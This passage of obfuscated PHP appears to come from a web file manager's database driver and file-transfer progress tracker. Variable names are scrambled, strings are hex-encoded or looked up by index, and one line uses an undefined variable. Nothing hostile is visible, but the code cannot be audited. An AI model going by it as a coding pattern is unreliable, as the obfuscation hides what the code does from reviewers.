$this->error(); return !1; } } return !0; } private function getAll() { $ œõÓ† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ œõÓ†); return $ œõÓ†; } public function getFields($ÌııİÄö) { $Í¹Ú÷Øá =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!0); if (think_config($Í¹Ú÷Øá[1045])) { $ƒ¶¾¢ˆ = str_replace($Í¹Ú÷Øá[1046], $ÌııİÄö, think_config($Í¹Ú÷Øá[1045])); } else { switch ($this->dbType) { case $Í¹Ú÷Øá[1029]: case $Í¹Ú÷Øá[1047]: $ƒ¶¾¢ˆ = "\123\x45\114\105\x43\x54\40\x20\40\143\x6f\154\x75\x6d\x6e\137\156\x61\155\x65\x20\x61\x73\x20\x27\116\141\155\145\x27\x2c\40\40\x20\x64\x61\x74\x61\x5f\164\171\x70\145\x20\x61\163\x20\47\x54\x79\160\x65\47\54\40\40\x20\143\x6f\x6c\x75\x6d\x6e\x5f\x64\x65\146\141\x75\154\164\40\x61\x73\40\x27\104\x65\x66\x61\x75\154\164\47\54\x20\40\x20\151\x73\137\156\x75\x6c\x6c\x61\142\154\x65\40\141\x73\40\47\116\165\154\x6c\x27\xa\x9\11\x46\x52\117\x4d\x9\x69\156\146\x6f\162\155\141\164\151\x6f\x6e\137\163\x63\150\145\x6d\141\56\164\x61\142\154\x65\x73\x20\101\123\40\x74\12\11\x9\x4a\x4f\x49\116\11\151\156\146\157\162\155\141\164\x69\x6f\156\x5f\x73\143\x68\145\x6d\x61\x2e\x63\157\154\165\155\x6e\163\x20\x41\123\40\x63\xa\11\x9\117\116\x20\x20\164\56\x74\x61\142\154\x65\137\x63\141\164\x61\x6c\157\147\x20\75\x20\143\x2e\x74\141\x62\154\145\137\x63\141\x74\x61\154\157\x67\xa\x9\11\101\x4e\104\x20\164\x2e\x74\141\x62\x6c\145\137\x73\x63\150\145\x6d\x61\40\x3d\x20\143\x2e\164\141\142\x6c\x65\137\163\143\150\145\155\x61\xa\x9\x9\101\116\x44\40\164\x2e\x74\141\142\154\145\137\156\141\x6d\x65\40\x3d\40\x63\x2e\x74\x61\x62\154\145\x5f\156\x61\155\145\xa\x9\11\127\110\105\x52\x45\x20\x20\x20\x74\x2e\164\x61\142\x6c\145\137\x6e\141\x6d\x65\40\75\40\47{$ÌııİÄö}\x27"; break; case $Í¹Ú÷Øá[1048]: $ƒ¶¾¢ˆ = $Í¹Ú÷Øá[1049] . $ÌııİÄö . $Í¹Ú÷Øá[1050]; break; case $Í¹Ú÷Øá[1030]: case $Í¹Ú÷Øá[1032]: $ƒ¶¾¢ˆ = $Í¹Ú÷Øá[1051] . $Í¹Ú÷Øá[1052] . $Í¹Ú÷Øá[1053] . strtoupper($ÌııİÄö) . $Í¹Ú÷Øá[1054] . strtoupper($ÌııİÄö) . $Í¹Ú÷Øá[1055]; break; case $Í¹Ú÷Øá[1056]: $ƒ¶¾¢ˆ = $Í¹Ú÷Øá[1057] . $ÌııİÄö . $Í¹Ú÷Øá[1058]; break; case $Í¹Ú÷Øá[1031]: break; case $Í¹Ú÷Øá[1059]: default: $ƒ¶¾¢ˆ = $Í¹Ú÷Øá[1060] . ($this->dbType == $Í¹Ú÷Øá[1059] ? "\x60{$ÌııİÄö}\x60" : $ÌııİÄö); } } $¹çÁù§ = $this->query($ƒ¶¾¢ˆ); $É°Êíã‡ = array(); if ($¹çÁù§) { foreach ($¹çÁù§ as $Û™á¼© => $€ı÷Á´) { $€ı÷Á´ = array_change_key_case($€ı÷Á´); $€ı÷Á´[$Í¹Ú÷Øá[32]] = isset($€ı÷Á´[$Í¹Ú÷Øá[32]]) ? $€ı÷Á´[$Í¹Ú÷Øá[32]] : $Í¹Ú÷Øá[463]; $€ı÷Á´[$Í¹Ú÷Øá[33]] = isset($€ı÷Á´[$Í¹Ú÷Øá[33]]) ? $€ı÷Á´[$Í¹Ú÷Øá[33]] : $Í¹Ú÷Øá[463]; $‹ÂéˆŠ = isset($€ı÷Á´[$Í¹Ú÷Øá[352]]) ? $€ı÷Á´[$Í¹Ú÷Øá[352]] : $€ı÷Á´[$Í¹Ú÷Øá[32]]; $É°Êíã‡[$‹ÂéˆŠ] = array($Í¹Ú÷Øá[32] => $‹ÂéˆŠ, $Í¹Ú÷Øá[33] => $€ı÷Á´[$Í¹Ú÷Øá[33]], $Í¹Ú÷Øá[35] => (bool) (isset($€ı÷Á´[$Í¹Ú÷Øá[104]]) && $€ı÷Á´[$Í¹Ú÷Øá[104]] === $Í¹Ú÷Øá[12] || isset($€ı÷Á´[$Í¹Ú÷Øá[35]]) && $€ı÷Á´[$Í¹Ú÷Øá[35]] === $Í¹Ú÷Øá[12]), $Í¹Ú÷Øá[37] => isset($€ı÷Á´[$Í¹Ú÷Øá[37]]) ? $€ı÷Á´[$Í¹Ú÷Øá[37]] : (isset($€ı÷Á´[$Í¹Ú÷Øá[56]]) ? $€ı÷Á´[$Í¹Ú÷Øá[56]] : $Í¹Ú÷Øá[463]), $Í¹Ú÷Øá[39] => isset($€ı÷Á´[$Í¹Ú÷Øá[95]]) ? strtolower($€ı÷Á´[$Í¹Ú÷Øá[95]]) == $Í¹Ú÷Øá[41] : (isset($€ı÷Á´[$Í¹Ú÷Øá[57]]) ? $€ı÷Á´[$Í¹Ú÷Øá[57]] : !1), $Í¹Ú÷Øá[42] => isset($€ı÷Á´[$Í¹Ú÷Øá[1061]]) ? strtolower($€ı÷Á´[$Í¹Ú÷Øá[1061]]) == $Í¹Ú÷Øá[44] : (isset($€ı÷Á´[$Í¹Ú÷Øá[95]]) ? $€ı÷Á´[$Í¹Ú÷Øá[95]] : !1)); } } return $É°Êíã‡; } public function getTables($½Ñ‡™™ = '') { $ãû¦–Ù° =& $_SERVER[öæÛ¿©¿]; if (think_config($ãû¦–Ù°[1062])) { $İ™„ = str_replace($ãû¦–Ù°[1063], $½Ñ‡™™, think_config($ãû¦–Ù°[1062])); } else { switch ($this->dbType) { case $ãû¦–Ù°[1030]: case $ãû¦–Ù°[1032]: $İ™„ = $ãû¦–Ù°[1064]; break; case $ãû¦–Ù°[1029]: case $ãû¦–Ù°[1047]: $İ™„ = $ãû¦–Ù°[1065]; break; case $ãû¦–Ù°[1056]: $İ™„ = $ãû¦–Ù°[1066]; break; case $ãû¦–Ù°[1031]: think_exception(think_lang($ãû¦–Ù°[1067]) . $ãû¦–Ù°[1068]); break; case $ãû¦–Ù°[1048]: $İ™„ = $ãû¦–Ù°[45] . $ãû¦–Ù°[46] . $ãû¦–Ù°[47]; break; case $ãû¦–Ù°[1059]: default: if (!empty($½Ñ‡™™)) { $İ™„ = $ãû¦–Ù°[1008] . $½Ñ‡™™ . $ãû¦–Ù°[1009]; } else { $İ™„ = $ãû¦–Ù°[1010]; } } } $ËæäÍ¤Ç = $this->query($İ™„); $Ó£˜Õ¬ = array(); foreach ($ËæäÍ¤Ç as $¿Õ¿¶ñ => $ª“½‚ó·) { $Ó£˜Õ¬[$¿Õ¿¶ñ] = current($ª“½‚ó·); } return $Ó£˜Õ¬; } protected function parseLimit($©¹™Â¸Á) { $…øŸ€Ì¼ =& $_SERVER[öæÛ¿©¿]; $¶Ö°çÖ = $…øŸ€Ì¼[12]; if (!empty($©¹™Â¸Á)) { switch ($this->dbType) { case $…øŸ€Ì¼[1056]: case $…øŸ€Ì¼[1048]: $©¹™Â¸Á = explode($…øŸ€Ì¼[50], $©¹™Â¸Á); if (count($©¹™Â¸Á) > 1) { $¶Ö°çÖ .= $…øŸ€Ì¼[51] . $©¹™Â¸Á[1] . $…øŸ€Ì¼[52] . $©¹™Â¸Á[0] . $…øŸ€Ì¼[53]; } else { $¶Ö°çÖ .= $…øŸ€Ì¼[51] . $©¹™Â¸Á[0] . $…øŸ€Ì¼[53]; } break; case $…øŸ€Ì¼[1029]: case $…øŸ€Ì¼[1047]: break; case $…øŸ€Ì¼[1031]: break; case $…øŸ€Ì¼[1030]: case $…øŸ€Ì¼[1032]: break; case $…øŸ€Ì¼[1059]: default: $¶Ö°çÖ .= $…øŸ€Ì¼[51] . $©¹™Â¸Á . $…øŸ€Ì¼[53]; } } return $¶Ö°çÖ; } public function parseKey(&$úÕ±ãòº, $Ø½·ü¸™ = true) { $ù¥Ô†¶– =& $_SERVER[öæÛ¿©¿]; if ($Ø½·ü¸™) { $úÕ±ãòº = $this->parseKeyCheck($úÕ±ãòº); } if ($this->dbType == $ù¥Ô†¶–[1059]) { if ($úÕ±ãòº != $ù¥Ô†¶–[221] && !preg_match($ù¥Ô†¶–[1023], $úÕ±ãòº)) { $úÕ±ãòº = $ù¥Ô†¶–[472] . trim($úÕ±ãòº, $ù¥Ô†¶–[472]) . $ù¥Ô†¶–[472]; } return $úÕ±ãòº; } else { return parent::parseKey($úÕ±ãòº, $Ø½·ü¸™); } } public function close() { $this->_linkID = null; } public function error() { $Ëà’Ş¶ =& $_SERVER[öæÛ¿©¿]; if ($this->PDOStatement) { $¨«ˆ‹  = $this->PDOStatement->errorInfo(); $this->error = $¨«ˆ‹ [1] . $Ëà’Ş¶[4] . $¨«ˆ‹ [2]; } else { $this->error = $Ëà’Ş¶[12]; } if ($Ëà’Ş¶[12] != $this->queryStr) { $this->error .= LNG($Ëà’Ş¶[48]) . $this->queryStr; } think_trace($this->error, $Ëà’Ş¶[12], $Ëà’Ş¶[49]); return $this->error; } public function escapeString($õÆñ€¶Ë) { $²ï¤šá =& $_SERVER[öæÛ¿©¿]; switch ($this->dbType) { case $²ï¤šá[1056]: case $²ï¤šá[1029]: case $²ï¤šá[1047]: case $²ï¤šá[1059]: return addslashes($õÆñ€¶Ë); case $²ï¤šá[1031]: case $²ï¤šá[1048]: case $²ï¤šá[1030]: case $²ï¤šá[1032]: return str_ireplace($²ï¤šá[58], $²ï¤šá[59], $õÆñ€¶Ë); } } protected function parseValue($Ğİ÷ç½¿) { $£öùíàë =& $_SERVER[öæÛ¿©¿]; if (is_string($Ğİ÷ç½¿)) { $»ƒ·°úÜ = strpos($Ğİ÷ç½¿, $£öùíàë[4]) === 0 && in_array($Ğİ÷ç½¿, array_keys($this->bind)); $Ğİ÷ç½¿ = $»ƒ·°úÜ ? $this->escapeString($Ğİ÷ç½¿) : $£öùíàë[1069] . $this->escapeString($Ğİ÷ç½¿) . $£öùíàë[1069]; } elseif (isset($Ğİ÷ç½¿[0]) && is_string($Ğİ÷ç½¿[0]) && strtolower($Ğİ÷ç½¿[0]) == $£öùíàë[373]) { $Ğİ÷ç½¿ = $this->escapeString($Ğİ÷ç½¿[1]); } elseif (is_array($Ğİ÷ç½¿)) { $Ğİ÷ç½¿ = array_map(array($this, $£öùíàë[1070]), $Ğİ÷ç½¿); } elseif (is_bool($Ğİ÷ç½¿)) { $Ğİ÷ç½¿ = $Ğİ÷ç½¿ ? $£öùíàë[91] : $£öùíàë[229]; } elseif (is_null($Ğİ÷ç½¿)) { $Ğİ÷ç½¿ = $£öùíàë[104]; } return $Ğİ÷ç½¿; } public function getLastInsertId() { $õ²ó¿¯´ =& $_SERVER[öæÛ¿©¿]; switch ($this->dbType) { case $õ²ó¿¯´[1056]: case $õ²ó¿¯´[1048]: case $õ²ó¿¯´[1029]: case $õ²ó¿¯´[1047]: case $õ²ó¿¯´[1031]: case $õ²ó¿¯´[1059]: return $this->_linkID->lastInsertId(); case $õ²ó¿¯´[1030]: case $õ²ó¿¯´[1032]: $‡±¬Û¸ = $this->table; $µ¢íçĞ = $this->query("\123\x45\x4c\x45\x43\124\x20{$‡±¬Û¸}\56\143\165\x72\x72\166\x61\x6c\x20\143\165\x72\x72\166\x61\154\40\106\x52\x4f\x4d\40\x64\x75\x61\154"); return $µ¢íçĞ ? $µ¢íçĞ[0][$õ²ó¿¯´[1071]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ø¦õú–ê) { $µ°‡†¹ğ =& $_SERVER[öæÛ¿©¿]; if (!CacheLock::fileLock($µ°‡†¹ğ[13])) { return !1; } $ßÈÏ¸Ã = parent::query($Ø¦õú–ê); CacheLock::fileUnLock($µ°‡†¹ğ[13]); return $ßÈÏ¸Ã; } public function execute($Óìî¡¹) { $Óºí»õ’ =& $_SERVER[öæÛ¿©¿]; if (!CacheLock::fileLock($Óºí»õ’[13])) { return !1; } $§¨˜ş£µ = parent::execute($Óìî¡¹); CacheLock::fileUnLock($Óºí»õ’[13]); return $§¨˜ş£µ; } } goto EäÇ¥ç»î; Fßô›Û‘×ç: class TaskFileTransfer extends Task { protected function startAfter() { $°•ºâ…Ï =& $_SERVER[öæÛ¿©¿]; $Ü¸€Å“İ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($°•ºâ…Ï[1955], array($this, $°•ºâ…Ï[1956])); Hook::bind($°•ºâ…Ï[1356], array($this, $°•ºâ…Ï[1957])); Hook::bind($°•ºâ…Ï[1958], array($this, $°•ºâ…Ï[1959])); Hook::bind($°•ºâ…Ï[687], array($this, $°•ºâ…Ï[1960])); Hook::bind($°•ºâ…Ï[688], array($this, $°•ºâ…Ï[1961])); Hook::bind($°•ºâ…Ï[694], array($this, $°•ºâ…Ï[1962])); Hook::bind($°•ºâ…Ï[695], array($this, $°•ºâ…Ï[1963])); Hook::bind($°•ºâ…Ï[690], array($this, $°•ºâ…Ï[1964])); Hook::bind($°•ºâ…Ï[692], array($this, $°•ºâ…Ï[1965])); Hook::bind($°•ºâ…Ï[656], array($this, $°•ºâ…Ï[1966])); Hook::bind($°•ºâ…Ï[653], array($this, $°•ºâ…Ï[1966])); Hook::bind($°•ºâ…Ï[658], array($this, $°•ºâ…Ï[1966])); Hook::bind($°•ºâ…Ï[660], array($this, $°•ºâ…Ï[1966])); Hook::bind($°•ºâ…Ï[662], array($this, $°•ºâ…Ï[1966])); Hook::bind($°•ºâ…Ï[1967], array($this, $°•ºâ…Ï[1968])); Hook::bind($°•ºâ…Ï[678], array($this, $°•ºâ…Ï[1969])); $this->sourceModelCopyFlag = !1; Hook::bind($°•ºâ…Ï[1970], array($this, $°•ºâ…Ï[1971])); Hook::bind($°•ºâ…Ï[1972], array($this, $°•ºâ…Ï[1973])); Hook::bind($°•ºâ…Ï[1974], array($this, $°•ºâ…Ï[1975])); $Ü¸€Å“İ[$°•ºâ…Ï[1976]] = LNG($°•ºâ…Ï[1977]); $Ü¸€Å“İ[$°•ºâ…Ï[1978]] = 0; $Ü¸€Å“İ[$°•ºâ…Ï[1979]] = 0; $Ü¸€Å“İ[$°•ºâ…Ï[1176]] = $°•ºâ…Ï[12]; $Ü¸€Å“İ[$°•ºâ…Ï[1980]] = $°•ºâ…Ï[12]; $Ü¸€Å“İ[$°•ºâ…Ï[1981]] = 0; $Ü¸€Å“İ[$°•ºâ…Ï[1982]] = 0; $Ü¸€Å“İ[$°•ºâ…Ï[1983]] = 0; if (!$Ü¸€Å“İ[$°•ºâ…Ï[1813]]) { $Ü¸€Å“İ[$°•ºâ…Ï[1813]] = LNG($°•ºâ…Ï[1984]); } } protected function endAfter() { $ÛıµÁ»û =& $_SERVER[öæÛ¿©¿]; Hook::unbind($ÛıµÁ»û[1955], array($this, $ÛıµÁ»û[1956])); Hook::unbind($ÛıµÁ»û[1356], array($this, $ÛıµÁ»û[1957])); Hook::unbind($ÛıµÁ»û[1958], array($this, $ÛıµÁ»û[1959])); Hook::unbind($ÛıµÁ»û[687], array($this, $ÛıµÁ»û[1960])); Hook::unbind($ÛıµÁ»û[688], array($this, $ÛıµÁ»û[1961])); Hook::unbind($ÛıµÁ»û[694], array($this, $ÛıµÁ»û[1962])); Hook::unbind($ÛıµÁ»û[695], array($this, $ÛıµÁ»û[1963])); Hook::unbind($ÛıµÁ»û[690], array($this, $ÛıµÁ»û[1964])); Hook::unbind($ÛıµÁ»û[692], array($this, $ÛıµÁ»û[1965])); Hook::unbind($ÛıµÁ»û[656], array($this, $ÛıµÁ»û[1966])); Hook::unbind($ÛıµÁ»û[653], array($this, $ÛıµÁ»û[1966])); Hook::unbind($ÛıµÁ»û[658], array($this, $ÛıµÁ»û[1966])); Hook::unbind($ÛıµÁ»û[660], array($this, $ÛıµÁ»û[1966])); Hook::unbind($ÛıµÁ»û[662], array($this, $ÛıµÁ»û[1966])); Hook::unbind($ÛıµÁ»û[1967], array($this, $ÛıµÁ»û[1968])); Hook::unbind($ÛıµÁ»û[678], array($this, $ÛıµÁ»û[1969])); Hook::unbind($ÛıµÁ»û[1970], array($this, $ÛıµÁ»û[1971])); Hook::unbind($ÛıµÁ»û[1972], array($this, $ÛıµÁ»û[1973])); Hook::unbind($ÛıµÁ»û[1974], array($this, $ÛıµÁ»û[1975])); } public function copyMoveStart($ø¹Êé‹Ë, $ÙÖÚ×’•, $ÕÕ›ıı£, $ÁğéÓ¸É) { $÷¼íÒäÜ =& $_SERVER[öæÛ¿©¿]; self::log($÷¼íÒäÜ[1985] . $ÙÖÚ×’• . $÷¼íÒäÜ[73] . $ÁğéÓ¸É); $®°ÃåÍ = rtrim(TEMP_FILES, $÷¼íÒäÜ[8]); if (substr($ÙÖÚ×’•, 0, strlen($®°ÃåÍ)) == $®°ÃåÍ) { return; } if (substr($ÁğéÓ¸É, 0, strlen($®°ÃåÍ)) == $®°ÃåÍ) { return; } $‹ı€©è =& $this->task; $‹ı€©è[$÷¼íÒäÜ[1986]] = KodIO::transferType($ø¹Êé‹Ë, $ÕÕ›ıı£); self::log($÷¼íÒäÜ[1987] . $‹ı€©è[$÷¼íÒäÜ[1986]] . $÷¼íÒäÜ[74] . $ÙÖÚ×’• . $÷¼íÒäÜ[73] . $ÁğéÓ¸É); $this->update(); } public function updateAfter() { $Îªı™„¦ =& $_SERVER[öæÛ¿©¿]; $ì¦­¸Ş˜ =& $this->task; if (!$ì¦­¸Ş˜[$Îªı™„¦[856]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ì¦­¸Ş˜[$Îªı™„¦[1986]] == $Îªı™„¦[1459]) { return; } self::updateTask($ì¦­¸Ş˜); } private static function updateTask(&$ Ê¡ÑÒ) { $›ºı®±İ =& $_SERVER[öæÛ¿©¿]; if ($ Ê¡ÑÒ[$›ºı®±İ[1986]] == $›ºı®±İ[1327] || $ Ê¡ÑÒ[$›ºı®±İ[1986]] == $›ºı®±İ[108]) { if ($ Ê¡ÑÒ[$›ºı®±İ[1980]]) { $ Ê¡ÑÒ[$›ºı®±İ[1983]] = $ Ê¡ÑÒ[$›ºı®±İ[1982]] + $ Ê¡ÑÒ[$›ºı®±İ[1979]]; } } else { if ($ Ê¡ÑÒ[$›ºı®±İ[1986]] == $›ºı®±İ[1460]) { if ($ Ê¡ÑÒ[$›ºı®±İ[1980]] == $›ºı®±İ[1327]) { $ Ê¡ÑÒ[$›ºı®±İ[1983]] = $ Ê¡ÑÒ[$›ºı®±İ[1982]] + $ Ê¡ÑÒ[$›ºı®±İ[1979]] * 0.5; } else { if ($ Ê¡ÑÒ[$›ºı®±İ[1980]] == $›ºı®±İ[108]) { $ Ê¡ÑÒ[$›ºı®±İ[1983]] = $ Ê¡ÑÒ[$›ºı®±İ[1982]] + $ Ê¡ÑÒ[$›ºı®±İ[1978]] * 0.5 + $ Ê¡ÑÒ[$›ºı®±İ[1979]] * 0.5; } } } } $ Ê¡ÑÒ[$›ºı®±İ[1926]] = $ Ê¡ÑÒ[$›ºı®±İ[1983]] / $ Ê¡ÑÒ[$›ºı®±İ[856]]; if ($ Ê¡ÑÒ[$›ºı®±İ[1926]] > 0) { $©ÔîÆ¶ = timeFloat() - $ Ê¡ÑÒ[$›ºı®±İ[1928]] - $ Ê¡ÑÒ[$›ºı®±İ[1931]]; $ Ê¡ÑÒ[$›ºı®±İ[1932]] = $©ÔîÆ¶ * (1 - $ Ê¡ÑÒ[$›ºı®±İ[1926]]) / $ Ê¡ÑÒ[$›ºı®±İ[1926]]; } $âíÃÒ  = $ Ê¡ÑÒ[$›ºı®±İ[1979]] . $›ºı®±İ[939] . $ Ê¡ÑÒ[$›ºı®±İ[1978]] . "\73\40{$áÊ­†Íé}\73" . $ Ê¡ÑÒ[$›ºı®±İ[1983]]; self::log($›ºı®±İ[1988] . $ Ê¡ÑÒ[$›ºı®±İ[1980]] . $›ºı®±İ[74] . $ Ê¡ÑÒ[$›ºı®±İ[1926]] . $›ºı®±İ[74] . $âíÃÒ ); } public function addPath($µş½İŠ˜) { $Ãú¬êé =& $_SERVER[öæÛ¿©¿]; if (!$µş½İŠ˜) { return; } $÷íÏÁ·Ô =& $this->task; $“‹«½Àô = IO::infoWithChildren($µş½İŠ˜); $è¿ö“÷ = $÷íÏÁ·Ô[$Ãú¬êé[1989]] ? $÷íÏÁ·Ô[$Ãú¬êé[1989]][$Ãú¬êé[1990]] : 0; $÷íÏÁ·Ô[$Ãú¬êé[1989]] = array($Ãú¬êé[1990] => $è¿ö“÷ + 1, $Ãú¬êé[505] => $“‹«½Àô[$Ãú¬êé[32]], $Ãú¬êé[87] => $“‹«½Àô[$Ãú¬êé[87]], $Ãú¬êé[598] => $“‹«½Àô[$Ãú¬êé[598]] ? $“‹«½Àô[$Ãú¬êé[598]] : $“‹«½Àô[$Ãú¬êé[87]]); if ($“‹«½Àô[$Ãú¬êé[33]] == $Ãú¬êé[231]) { $÷íÏÁ·Ô[$Ãú¬êé[1174]] += 1; } else { $÷íÏÁ·Ô[$Ãú¬êé[1174]] += $“‹«½Àô[$Ãú¬êé[82]][$Ãú¬êé[80]]; if ($“‹«½Àô[$Ãú¬êé[192]]) { $÷íÏÁ·Ô[$Ãú¬êé[1174]] += $“‹«½Àô[$Ãú¬êé[82]][$Ãú¬êé[81]] + 1; } } $÷íÏÁ·Ô[$Ãú¬êé[856]] += $“‹«½Àô[$Ãú¬êé[79]]; $this->update(); self::log(array($Ãú¬êé[1991] . $µş½İŠ˜, $“‹«½Àô)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Èô ‡£Ë) { } public function sourceAddHashEnd($·úÕ×Çø) { } public function sourceAddFileStart($¾µ„£½Ú) { $¿ôé×“º =& $_SERVER[öæÛ¿©¿]; $şİá¦Ğ° =& $this->task; $şİá¦Ğ°[$¿ôé×“º[1978]] = $¾µ„£½Ú[$¿ôé×“º[79]]; $şİá¦Ğ°[$¿ôé×“º[1976]] = $¾µ„£½Ú[$¿ôé×“º[32]]; $şİá¦Ğ°[$¿ôé×“º[1176]] = $¾µ„£½Ú[$¿ôé×“º[32]]; $şİá¦Ğ°[$¿ôé×“º[1992]] = $¾µ„£½Ú[$¿ôé×“º[87]]; $this->update(); self::log($¿ôé×“º[1993] . $¾µ„£½Ú[$¿ôé×“º[87]] . $¿ôé×“º[1994] . $¾µ„£½Ú[$¿ôé×“º[79]]); } public function sourceAddFileEnd($ŠØ…âî–) { $Ë‚âÁÁ¦ =& $_SERVER[öæÛ¿©¿]; $Ë•İ… =& $this->task; $Ë•İ…[$Ë‚âÁÁ¦[1983]] += $ŠØ…âî–[$Ë‚âÁÁ¦[79]]; $Ë•İ…[$Ë‚âÁÁ¦[1992]] = $ŠØ…âî–[$Ë‚âÁÁ¦[87]]; $this->update(1); self::log($Ë‚âÁÁ¦[1995] . $ŠØ…âî–[$Ë‚âÁÁ¦[87]] . $Ë‚âÁÁ¦[1994] . $ŠØ…âî–[$Ë‚âÁÁ¦[79]] . $Ë‚âÁÁ¦[1996]); } public function copyFileStart($ôÒ´Š«æ, $Ï’ãÛä¢, $âŒ•åºä, $¦¸«, $ï«úç¼ô, $ß±÷’½•) { $ê†Ñ’“ =& $_SERVER[öæÛ¿©¿]; $şğ©± = $ï«úç¼ô; if ($şğ©± == $GLOBALS[$ê†Ñ’“[1997]]) { $şğ©± = $GLOBALS[$ê†Ñ’“[1998]]; } $GLOBALS[$ê†Ñ’“[1998]] = $ï«úç¼ô; $GLOBALS[$ê†Ñ’“[1997]] = $ß±÷’½•; $£ŸûĞ˜ô =& $this->task; $£ŸûĞ˜ô[$ê†Ñ’“[1976]] = $şğ©±; $£ŸûĞ˜ô[$ê†Ñ’“[1978]] = (int) $ôÒ´Š«æ->size($Ï’ãÛä¢); $£ŸûĞ˜ô[$ê†Ñ’“[1979]] = 0; $£ŸûĞ˜ô[$ê†Ñ’“[1176]] = $ê†Ñ’“[12]; $£ŸûĞ˜ô[$ê†Ñ’“[1980]] = $ê†Ñ’“[12]; $£ŸûĞ˜ô[$ê†Ñ’“[1981]] = 0; $ŠÔ†çƒ¥ = $£ŸûĞ˜ô[$ê†Ñ’“[1978]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($£ŸûĞ˜ô[$ê†Ñ’“[483]] . $ê†Ñ’“[1999]); if ($ŠÔ†çƒ¥ && file_exists(get_path_father($¦¸«))) { Cache::set($£ŸûĞ˜ô[$ê†Ñ’“[483]] . $ê†Ñ’“[1999], $¦¸«); $£ŸûĞ˜ô[$ê†Ñ’“[1949]] = array($ê†Ñ’“[2000], $ê†Ñ’“[2001]); } $this->update(0, $ŠÔ†çƒ¥); self::log("\143\157\x70\171\106\151\x6c\145\123\164\141\162\x74\x3a{$Ï’ãÛä¢}\x3b"); } public static function updateCopyLocalFileSize($ƒ£ˆéÌÈ) { $î›şƒ– =& $_SERVER[öæÛ¿©¿]; $ÚíäÎ» = Cache::get($ƒ£ˆéÌÈ[$î›şƒ–[483]] . $î›şƒ–[1999]); if (!$ÚíäÎ» || !file_exists($ÚíäÎ»)) { return $ƒ£ˆéÌÈ; } $ƒ£ˆéÌÈ[$î›şƒ–[1979]] = @filesize($ÚíäÎ»); $ƒ£ˆéÌÈ[$î›şƒ–[1983]] += $ƒ£ˆéÌÈ[$î›şƒ–[1979]]; self::updateTask($ƒ£ˆéÌÈ); return $ƒ£ˆéÌÈ; } public function copyFileEnd($›©íšÍÑ, $®È ¤Ñú, $”Õõ‚ü, $‹åäÄäş, $Íß´°ê¦, $¬¤úšü®) { $±¡Û‘€ =& $_SERVER[öæÛ¿©¿]; $Âùã­‘§ =& $this->task; $Âùã­‘§[$±¡Û‘€[1979]] = $Âùã­‘§[$±¡Û‘€[1978]]; $Âùã­‘§[$±¡Û‘€[1980]] = $±¡Û‘€[12]; unset($Âùã­‘§[$±¡Û‘€[1949]]); if ($Íß´°ê¦ == $Âùã­‘§[$±¡Û‘€[1976]]) { $Âùã­‘§[$±¡Û‘€[1982]] += $Âùã­‘§[$±¡Û‘€[1978]]; $Âùã­‘§[$±¡Û‘€[1983]] = $Âùã­‘§[$±¡Û‘€[1982]]; $ØÜİ’à = 1; if (isset($Âùã­‘§[$±¡Û‘€[1992]]) && $Âùã­‘§[$±¡Û‘€[1992]] == $®È ¤Ñú) { $ØÜİ’à = 0; } $this->update($ØÜİ’à); } else { $this->update(); $Âùã­‘§[$±¡Û‘€[1979]] = 0; } Cache::remove($Âùã­‘§[$±¡Û‘€[483]] . $±¡Û‘€[1999]); self::log($±¡Û‘€[2002] . $®È ¤Ñú . $±¡Û‘€[73] . $‹åäÄäş . $±¡Û‘€[286] . $Íß´°ê¦ . $±¡Û‘€[2003] . $Âùã­‘§[$±¡Û‘€[1976]]); } public function updateFileEnd($ìÖÚÍ…á, $×„°„Ù) { $Ë¬ºÍöÑ =& $_SERVER[öæÛ¿©¿]; $–ÜìÛİ‡ =& $this->task; $–ÜìÛİ‡[$Ë¬ºÍöÑ[1976]] = $ìÖÚÍ…á; $–ÜìÛİ‡[$Ë¬ºÍöÑ[1978]] = $×„°„Ù; $–ÜìÛİ‡[$Ë¬ºÍöÑ[1982]] += $×„°„Ù; $–ÜìÛİ‡[$Ë¬ºÍöÑ[1983]] = $–ÜìÛİ‡[$Ë¬ºÍöÑ[1982]]; $this->update(1); self::log($Ë¬ºÍöÑ[2004] . $ìÖÚÍ…á); } public function sourceModelCopy($”®Ö­À¾) { $‰±¢¬ÍÙ =& $_SERVER[öæÛ¿©¿]; $–åêÈ³ç = $”®Ö­À¾[0]; $½õÅ†­ = $”®Ö­À¾[1]; $Î¬©£ =& $this->task; $this->sourceModelCopyFlag = !0; $‘ÊîÉÇË = 0; switch ($–åêÈ³ç) { case $‰±¢¬ÍÙ[654]: $‘ÊîÉÇË = 1; break; case $‰±¢¬ÍÙ[657]: $Î¬©£[$‰±¢¬ÍÙ[1976]] = $½õÅ†­[$‰±¢¬ÍÙ[32]]; break; case $‰±¢¬ÍÙ[659]: $‘ÊîÉÇË = intval($”®Ö­À¾[$‰±¢¬ÍÙ[467]] * 0.4); break; case $‰±¢¬ÍÙ[661]: $‘ÊîÉÇË = intval($”®Ö­À¾[$‰±¢¬ÍÙ[467]] * 0.2); break; case $‰±¢¬ÍÙ[663]: $‘ÊîÉÇË = intval($”®Ö­À¾[$‰±¢¬ÍÙ[467]] * 0.4); break; } $this->update($‘ÊîÉÇË); self::log(array("{$–åêÈ³ç}\73\x61\144\144\x3d{$‘ÊîÉÇË}", $”®Ö­À¾)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($òÈ¸Ë·, $‡©÷Ş™) { $¤’×Œ‹£ =& $_SERVER[öæÛ¿©¿]; $this->sourceModelCopyFlag = !0; $çÃ„±§ = 1; if (isset($òÈ¸Ë·[$¤’×Œ‹£[82]])) { $çÃ„±§ = $òÈ¸Ë·[$¤’×Œ‹£[82]][$¤’×Œ‹£[80]]; $çÃ„±§ = $çÃ„±§ + $òÈ¸Ë·[$¤’×Œ‹£[82]][$¤’×Œ‹£[81]] + 1; } $this->update($çÃ„±§); $this->sourceModelCopyFlag = !1; $this->log(array($¤’×Œ‹£[2005], $çÃ„±§, $òÈ¸Ë·)); } public function sourceMove($î‘±¡èù) { $this->sourceRemove($î‘±¡èù, !1); } public function curlProgress($†äêòª°, $ïÆúÊ×², $¸ó¼Í æ, $Åâå­æÏ, 